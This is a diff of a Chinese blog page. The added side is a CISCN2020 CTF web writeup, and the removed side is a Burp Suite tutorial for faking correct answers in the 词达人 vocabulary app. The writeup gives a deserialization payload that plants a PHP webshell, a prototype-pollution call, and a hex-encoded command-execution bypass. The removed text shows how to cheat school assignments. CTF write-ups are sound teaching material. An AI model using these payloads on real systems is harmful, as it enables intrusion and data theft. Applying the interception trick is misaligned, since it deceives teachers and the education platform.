@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="词达人," />
+  <meta name="keywords" content="CTF,web,writeup," />
 
 
 
@@ -83,28 +83,22 @@
 
 
 
-<meta name="description" content="前提本文默认你具备使用burp的能力以及对json数据格式有所了解，并且可以为手机配置代理或者对安卓模拟器进行设置. 还需要你有配置https证书的能力。  2020&#x2F;3&#x2F;22更新 很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。所以我们需要往您的手机导入安卓证书，这里操作如下。 访问代理ip地址，如我burp的ip地址为 172.16.20.107 端口为8080 那么我就">
-<meta name="keywords" content="词达人">
+<meta name="description" content="CISCN2020 初赛WEBwriteupbabyunserialize题目给了源码 经过一番搜索（搜__destruct）找到了image.php jig.php ws.php 查看了一番代码，发现jig.php里面有write函数，综合查看一番，是可以任意写文件的。 根据代码，写入初始化变量的值：  这样即可让它写到web根目录里面的shell.php中。 然后就是输出url编码的序列号字符">
+<meta name="keywords" content="CTF,web,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简简单单过词达人各种任务">
-<meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2020&#x2F;03&#x2F;04&#x2F;jianjiandandancidaren.html">
+<meta property="og:title" content="CISCN2020 初赛WEB writeup">
+<meta property="og:url" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;2020&#x2F;08&#x2F;24&#x2F;ciscncs.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
-<meta property="og:description" content="前提本文默认你具备使用burp的能力以及对json数据格式有所了解，并且可以为手机配置代理或者对安卓模拟器进行设置. 还需要你有配置https证书的能力。  2020&#x2F;3&#x2F;22更新 很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。所以我们需要往您的手机导入安卓证书，这里操作如下。 访问代理ip地址，如我burp的ip地址为 172.16.20.107 端口为8080 那么我就">
+<meta property="og:description" content="CISCN2020 初赛WEBwriteupbabyunserialize题目给了源码 经过一番搜索（搜__destruct）找到了image.php jig.php ws.php 查看了一番代码，发现jig.php里面有write函数，综合查看一番，是可以任意写文件的。 根据代码，写入初始化变量的值：  这样即可让它写到web根目录里面的shell.php中。 然后就是输出url编码的序列号字符">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200322134517924.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304212731446.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304212713261.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304212848065.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304212915940.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304213348899.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304213706254.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304213940822.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304214048764.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304214311276.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200304214517300.png">
-<meta property="og:updated_time" content="2020-04-16T03:32:51.243Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104135895.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104121782.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104108940.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104400190.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104408894.png">
+<meta property="og:updated_time" content="2020-08-24T02:47:10.624Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200322134517924.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;mrjesen.github.io&#x2F;images&#x2F;image-20200824104135895.png">
 
 
 
@@ -134,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://mrjesen.github.io/2020/03/04/jianjiandandancidaren.html"/>
+  <link rel="canonical" href="http://mrjesen.github.io/2020/08/24/ciscncs.html"/>
 
 
 
 
 
-  <title>简简单单过词达人各种任务 | Jesen's Blog</title>
+  <title>CISCN2020 初赛WEB writeup | Jesen's Blog</title>
   
 
 
@@ -267,7 +261,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://mrjesen.github.io/2020/03/04/jianjiandandancidaren.html">
+    <link itemprop="mainEntityOfPage" href="http://mrjesen.github.io/2020/08/24/ciscncs.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Jesen">
@@ -284,7 +278,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">简简单单过词达人各种任务</h2>
+          <h2 class="post-title" itemprop="name headline">CISCN2020 初赛WEB writeup</h2>
         
 
         <div class="post-meta">
@@ -297,8 +291,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T21:21:01+08:00">
-                2020-03-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-24T10:37:46+08:00">
+                2020-08-24
               </time>
             
 
@@ -320,8 +314,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index">
-                    <span itemprop="name">其他</span>
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
                   </a>
                 </span>
 
@@ -338,8 +332,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2020/03/04/jianjiandandancidaren.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2020/03/04/jianjiandandancidaren.html" itemprop="commentCount"></span>
+                <a href="/2020/08/24/ciscncs.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/08/24/ciscncs.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -367,47 +361,52 @@
       
 
       
-        <h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本文默认你具备使用burp的能力以及对json数据格式有所了解，并且可以为手机配置代理或者对安卓模拟器进行设置. 还需要你有配置https证书的能力。</p>
-<hr>
-<h1 id="2020-3-22更新"><a href="#2020-3-22更新" class="headerlink" title="2020/3/22更新"></a>2020/3/22更新</h1><p><img src="/images/image-20200322134517924.png" alt="image-20200322134517924"></p>
-<h4 id="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"><a href="#很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。" class="headerlink" title="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"></a>很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。</h4><p>所以我们需要往您的手机导入安卓证书，这里操作如下。</p>
-<p>访问代理ip地址，如我burp的ip地址为 172.16.20.107 端口为8080 那么我就访问<a href="http://172.16.20.107:8080/" target="_blank" rel="noopener">http://172.16.20.107:8080/</a></p>
-<p>点击右上角 CA cert*** 下载证书，下载的文件是der格式的，手机可能无法直接打开，需要改成cacert.crt就是把der改成crt文件。 具体操作参见：<a href="https://blog.csdn.net/wst0717/article/details/83787153" target="_blank" rel="noopener">https://blog.csdn.net/wst0717/article/details/83787153</a></p>
-<p><font color=green>注：导入后手机的状态栏会提示:网络可能会受到监控，正常现象</font></p>
-<p>打开进行安装即可。这里不再截图。</p>
-<p>然后现在只能改答案为true来欺骗客户端了，想改分需要拿到sign参数的具体文件，我有点懒，就不发出来了。。</p>
-<p><font color=blue>祝你们好运！</font></p>
-<h4 id="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"><a href="#不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。" class="headerlink" title="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"></a>不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。</h4><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="1-启动burpsuite2-1版本"><a href="#1-启动burpsuite2-1版本" class="headerlink" title="1.启动burpsuite2.1版本"></a>1.启动burpsuite2.1版本</h2><p>修改监听地址为:0.0.0.0:8080(本人在用这个，不想用这个也可以不用)</p>
-<p><img src="/images/image-20200304212731446.png" alt="image-20200304212731446"></p>
-<p><img src="/images/image-20200304212713261.png" alt="image-20200304212713261"></p>
-<h2 id="2-手机修改代理服务器"><a href="#2-手机修改代理服务器" class="headerlink" title="2.手机修改代理服务器"></a>2.手机修改代理服务器</h2><p>手机修改wifi下的代理服务器，这里我本机局域网ip为172.20.16.107</p>
-<p>所以我设置代理为172.20.16.107:8080</p>
-<p>如图:</p>
-<p><img src="/images/image-20200304212848065.png" alt="image-20200304212848065"></p>
-<p>不知道自己的ip可以去路由器管理界面看，或者使用cmd命令ipconfig获取，其他方法也可以，无限制。</p>
-<p>设置好后把proxy的拦截关掉</p>
-<p><img src="/images/image-20200304212915940.png" alt="image-20200304212915940"></p>
-<p>接下来http history会走过远远不断的流数据。</p>
-<h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><p>我这里用<strong>词达人</strong>的某个自学任务测试</p>
-<p>设置学习模式为快速模式(哈哈哈)</p>
-<p><strong>选择所有单词</strong>后开始学习，第一类型题掠过，直接继续即可  <em>不怕麻烦可以少选几个，也没关系哈哈哈</em></p>
-<p>再多说一嘴，就是这个第一个类型题也就是单纯为你朗读单词这个，是不算分数的。</p>
-<p><img src="/images/image-20200304213348899.png" alt="image-20200304213348899"></p>
-<p>到达此页面即可看到HTTP HISTORY最后一条<strong>POST</strong>的response</p>
-<p><img src="/images/image-20200304213706254.png" alt="image-20200304213706254"></p>
-<p>可以看到这里有answer:true的对应选项就是正确答案。<strong>不要着急选择</strong></p>
-<p>进入options选项卡（不是user options，也就是我第一个图的地方）</p>
-<p>下滑找到</p>
-<p><img src="/images/image-20200304213940822.png" alt="image-20200304213940822"></p>
-<p>点击Add按钮。</p>
-<p>type选择response body也就是修改响应包的报文。</p>
-<p><img src="/images/image-20200304214048764.png" alt="image-20200304214048764"></p>
-<p>这里去手机那里选完答案点击继续。</p>
-<p>下一题你就随便点击选项就可以了。</p>
-<p><img src="/images/image-20200304214311276.png" alt="image-20200304214311276"></p>
-<p>发现所有选项后面都带有小星星 ，就是修改成功了。</p>
-<h1 id="收工"><a href="#收工" class="headerlink" title="收工"></a>收工</h1><h2 id="代理选择-无-即可"><a href="#代理选择-无-即可" class="headerlink" title="代理选择: 无 即可"></a>代理选择: 无 即可</h2><p><img src="/images/image-20200304214517300.png" alt="image-20200304214517300"></p>
-<h2 id="然后关闭burp"><a href="#然后关闭burp" class="headerlink" title="然后关闭burp"></a>然后关闭burp</h2><p>感谢支持！</p>
+        <h1 id="CISCN2020-初赛WEBwriteup"><a href="#CISCN2020-初赛WEBwriteup" class="headerlink" title="CISCN2020 初赛WEBwriteup"></a>CISCN2020 初赛WEBwriteup</h1><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h3><p>题目给了源码</p>
+<p>经过一番搜索（搜__destruct）找到了<code>image.php jig.php ws.php</code></p>
+<p>查看了一番代码，发现jig.php里面有write函数，综合查看一番，是可以任意写文件的。</p>
+<p>根据代码，写入初始化变量的值：</p>
+<p><img src="/images/image-20200824104135895.png" alt="image-20200824104135895"></p>
+<p>这样即可让它写到web根目录里面的shell.php中。</p>
+<p>然后就是输出url编码的序列号字符串了：</p>
+<p> <img src="/images/image-20200824104121782.png" alt="image-20200824104121782"></p>
+<p>然后访问: </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>DB%<span class="number">5</span>CJig%<span class="number">22</span>%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>uuid%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>dir%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22.</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>format%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>log%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>data%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>shell.php%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A26%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="built_in">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B%<span class="number">27</span>d%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>lazy%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>即可成功getshell</p>
+<p>然后通过phpinfo();查看环境变量里面的flag值即可。</p>
+<p><img src="/images/image-20200824104108940.png" alt="image-20200824104108940"></p>
+<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h3><p>直接给了源代码，尝试过让trick1=array(“0”) trick2=array(1)</p>
+<p>结果发现在__destruct中把trick1强制转为了字符串，直接变成了string(5) “Array”</p>
+<p>后来发现当浮点数过大的时候会变成INF</p>
+<p>所以让</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;trick1 = (float)<span class="number">9e999</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;trick2 = (float)<span class="number">9e999</span>;</span><br></pre></td></tr></table></figure>
+
+<p>最后得到序列化字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;d:INF;s:6:&quot;trick2&quot;;d:INF;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后提交即可成功getflag</p>
+<h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h3><p>很明显考察原型链污染。</p>
+<p>查看源码就不说了</p>
+<p>GET访问/SpawnPoint初始化session</p>
+<p>查看代码发现使用 set-value，该js允许使用.来设置对应key的value</p>
+<p>那么我们可以看到：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以通过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFn(req.session.knight, <span class="string">"__proto__.password4"</span>, <span class="string">"test"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>污染Admin这个object的键值对</p>
+<p><img src="/images/image-20200824104400190.png" alt="image-20200824104400190"></p>
+<p>然后再：</p>
+<p><img src="/images/image-20200824104408894.png" alt="image-20200824104408894"></p>
+<p>顺利得到flag</p>
+<h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h3><p>直接给了代码，发现payload必须满足{if:xxxx}xxx{end if}格式</p>
+<p>对于每一个xxx都会通过danger_key()过滤一下</p>
+<p>综合一下还是采用hex2bin配合array_map绕过，把system /catflag都转成hex(array_filter也可以)</p>
+<p>最终的payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=&#123;<span class="keyword">if</span>:array_map(hex2bin(<span class="string">'73797374656d'</span>),[hex2bin(<span class="string">'636174202f666c6167'</span>)])&#125;xxx&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="另一个"><a href="#另一个" class="headerlink" title="另一个"></a>另一个</h3><p>题目忘了，没做出来，后来看了一下，让子进程异常就行了。</p>
 
       
     </div>
@@ -425,7 +424,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E8%AF%8D%E8%BE%BE%E4%BA%BA/" rel="tag"># 词达人</a>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
           
         </div>
       
@@ -438,8 +441,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/11/24/NJUCTF2019.html" rel="next" title="NJUCTF2019-部分wp">
-                <i class="fa fa-chevron-left"></i> NJUCTF2019-部分wp
+              <a href="/2020/07/12/2020GeekPwn-Cosplay.html" rel="next" title="2020GeekPwn-Cosplay题解">
+                <i class="fa fa-chevron-left"></i> 2020GeekPwn-Cosplay题解
               </a>
             
           </div>
@@ -447,10 +450,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/07/12/2020GeekPwn-Cosplay.html" rel="prev" title="2020GeekPwn-Cosplay题解">
-                2020GeekPwn-Cosplay题解 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -635,7 +634,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前提"><span class="nav-number">1.</span> <span class="nav-text">前提</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2020-3-22更新"><span class="nav-number">2.</span> <span class="nav-text">2020/3/22更新</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number">3.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-启动burpsuite2-1版本"><span class="nav-number">3.1.</span> <span class="nav-text">1.启动burpsuite2.1版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-手机修改代理服务器"><span class="nav-number">3.2.</span> <span class="nav-text">2.手机修改代理服务器</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#具体操作"><span class="nav-number">4.</span> <span class="nav-text">具体操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#收工"><span class="nav-number">5.</span> <span class="nav-text">收工</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代理选择-无-即可"><span class="nav-number">5.1.</span> <span class="nav-text">代理选择: 无 即可</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#然后关闭burp"><span class="nav-number">5.2.</span> <span class="nav-text">然后关闭burp</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2020-初赛WEBwriteup"><span class="nav-number">1.</span> <span class="nav-text">CISCN2020 初赛WEBwriteup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babyunserialize"><span class="nav-number">1.0.1.</span> <span class="nav-text">babyunserialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easytrick"><span class="nav-number">1.0.2.</span> <span class="nav-text">easytrick</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#littlegame"><span class="nav-number">1.0.3.</span> <span class="nav-text">littlegame</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rceme"><span class="nav-number">1.0.4.</span> <span class="nav-text">rceme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#另一个"><span class="nav-number">1.0.5.</span> <span class="nav-text">另一个</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
